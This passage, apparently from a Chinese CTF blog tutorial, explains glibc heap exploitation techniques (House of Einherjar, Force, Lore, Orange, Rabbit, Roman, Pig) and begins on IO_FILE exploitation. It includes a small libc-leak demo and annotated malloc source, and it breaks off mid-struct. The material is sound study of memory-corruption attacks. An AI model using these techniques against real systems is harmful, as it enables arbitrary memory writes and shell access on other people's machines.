<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后，我们就可以 leak libc 了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x555555559af0 (size : 0x20510)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x555555559250 (size : 0x110)</span><br><span class="line">(0x110)   tcache_entry[15]: 0x5555555599f0 --&gt; 0x5555555598e0 --&gt; 0x5555555597d0 --&gt; 0x5555555596c0 --&gt; 0x5555555595b0 --&gt; 0x5555555594a0 --&gt; 0x555555559390</span><br><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x555555559000      0x0                 0x250                Used                None              None</span><br><span class="line">0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0</span><br><span class="line">0x555555559360      0x110               0x20                 Used                None              None</span><br><span class="line">0x555555559380      0x0                 0x110                Used                None              None</span><br><span class="line">0x555555559490      0x0                 0x110                Used                None              None</span><br><span class="line">0x5555555595a0      0x0                 0x110                Used                None              None</span><br><span class="line">0x5555555596b0      0x0                 0x110                Used                None              None</span><br></pre></td></tr></table></figure>

<h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p><strong>house of系列在近几年比赛中几乎用不到，</strong></p>
<p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p>
<p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><h4 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h4><p><code>free</code> 函数中的后向合并核心操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    <span class="built_in">size</span> += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里借用原作者的一张图片说明</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220425194023719.png" alt="image-20220425194023719"></p>
<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>这里我们就介绍该利用的原理。首先，在之前的堆的介绍中，我们可以知道以下的知识</p>
<ul>
<li>两个物理相邻的 chunk 会共享 <code>prev_size</code>字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 <code>prev_size</code> 字段。</li>
<li>一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。</li>
<li>后向合并时，新的 chunk 的位置取决于 <code>chunk_at_offset(p, -((long) prevsize))</code> 。</li>
</ul>
<p><strong>那么如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</strong></p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><h4 id="溢出前"><a href="#溢出前" class="headerlink" title="溢出前"></a>溢出前</h4><p>假设溢出前的状态如下</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220425195635373.png" alt="image-20220425195635373"></p>
<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><p>这里我们假设 p0 堆块一方面可以写 prev_size 字段，另一方面，存在 off by one 的漏洞，可以写下一个 chunk 的 PREV_INUSE 部分，那么</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220425195935430.png" alt="image-20220425195935430"></p>
<h4 id="溢出后"><a href="#溢出后" class="headerlink" title="溢出后"></a>溢出后</h4><p><strong>假设我们将 p1 的 prev_size 字段设置为我们想要的目的 chunk 位置与 p1 的差值</strong>。在溢出后，我们释放 p1，则我们所得到的新的 chunk 的位置 <code>chunk_at_offset(p1, -((long) prevsize))</code> 就是我们想要的 chunk 位置了。</p>
<p>当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了 fake chunk 以便于绕过 unlink 的检测。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220425200003425.png" alt="image-20220425200003425"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里我们总结下这个利用技术需要注意的地方</p>
<ul>
<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li>
<li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li>
<li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
</ul>
<p>其实，该技术与 chunk extend/shrink 技术比较类似。</p>
<h2 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：</p>
<ol>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ol>
<p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line"><span class="built_in">size</span>   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)</span><br></pre></td></tr></table></figure>

<p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<p>之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p>
<p><strong>与此同时，我们需要注意的是，topchunk 的 size 也会更新，其更新的方法如下</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line"><span class="built_in">size</span>   = chunksize(victim);</span><br><span class="line">remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">set_head(remainder, remainder_size | PREV_INUSE);</span><br></pre></td></tr></table></figure>

<p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>其实 HOF 的利用要求还是相当苛刻的。</p>
<ul>
<li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li>
<li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li>
<li>第三，分配的次数不能受限制</li>
</ul>
<p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过 HOF 的方法进行利用。</p>
<h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p>
<p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
<p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   If a small request, check regular bin.  Since these <span class="string">"smallbins"</span></span><br><span class="line">   hold one size each, no searching within bins <span class="keyword">is</span> necessary.</span><br><span class="line">   (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">   processed to find best fit. But <span class="keyword">for</span> small ones, fits are exact</span><br><span class="line">   anyway, so we can check now, which <span class="keyword">is</span> faster.)</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    // 获取 small bin 的索引</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    // 获取对应 small bin 中的 chunk 指针</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span><br><span class="line">    // 如果 victim = bin ，那说明该 bin 为空。</span><br><span class="line">    // 如果不相等，那么会有两种情况</span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        // 第一种情况，small bin 还没有初始化。</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) /* initialization check */</span><br><span class="line">            // 执行初始化，将 fast bins 中的 chunk 进行合并</span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        // 第二种情况，small bin 中存在空闲的 chunk</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            // 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            // 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">            if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                goto errout;</span><br><span class="line">            &#125;</span><br><span class="line">            // 设置 victim 对应的 inuse 位</span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            // 如果不是 main_arena，设置对应的标志</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            // 细致的检查</span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            // 将申请到的 chunk 转化为对应的 mem 状态</span><br><span class="line">            void *p = chunk2mem(victim);</span><br><span class="line">            // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ <span class="number">0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从下面的这部分我们可以看出</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">// 设置 victim 对应的 inuse 位</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>

<p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。</p>
<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p>
<p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p>
<p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p>
<p>我们总结一下伪造的 top chunk size 的要求</p>
<ol>
<li>伪造的 size 必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ol>
<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p>
<h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h2><p>fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备。</p>
<p><code>前提条件</code>: 1. 可以修改 fastbin 的 fd 指针或 size 2. 可以触发 malloc consolidate(merge top 或 malloc big chunk 等等)</p>
<p>House of rabbit 的优点是容易构造 overlap chunk，由于可以基于 fastbin attack，甚至不需要 leak 就可以完成攻击。</p>
<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。</p>
<p>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p>
<p>整个利用过程大概可以分为三步骤。</p>
<ol>
<li>将 FD 指向 malloc_hook</li>
<li>修正 0x71 的 Freelist</li>
<li>往 malloc_hook 写入 one gadget</li>
</ol>
<h2 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h2><p>House of Pig 是一个将 Tcache Statsh Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。</p>
<p>利用条件为</p>
<ul>
<li>存在 UAF</li>
<li>能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回。</li>
</ul>
<p>主要利用的函数为 <code>_IO_str_overflow</code>，可以参考 <a href="https://ctf-wiki.org/pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-overflow" target="_blank" rel="noopener">glibc 2.24 下 IO_FILE 的利用</a>。</p>
<p>利用流程为</p>
<ol>
<li>进行一个 Tcache Stash Unlink+ 攻击，把地址 <code>__free_hook - 0x10</code> 写入 tcache_pthread_struct。由于该攻击要求 <code>__free_hook - 0x8</code> 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</li>
<li>再进行一个 large bin attack，修改 <code>_IO_list_all</code> 为一个堆地址，然后在该处伪造 <code>_IO_FILE</code> 结构体。</li>
<li>通过伪造的结构体触发 <code>_IO_str_overflow</code> getshell。</li>
</ol>
<h2 id="IO-FILE-Exploitation"><a href="#IO-FILE-Exploitation" class="headerlink" title="IO_FILE Exploitation"></a>IO_FILE Exploitation</h2><h3 id="FILE-结构"><a href="#FILE-结构" class="headerlink" title="FILE 结构"></a>FILE 结构</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p>
<p>FILE 结构定义在 libio.h 中，如下所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of 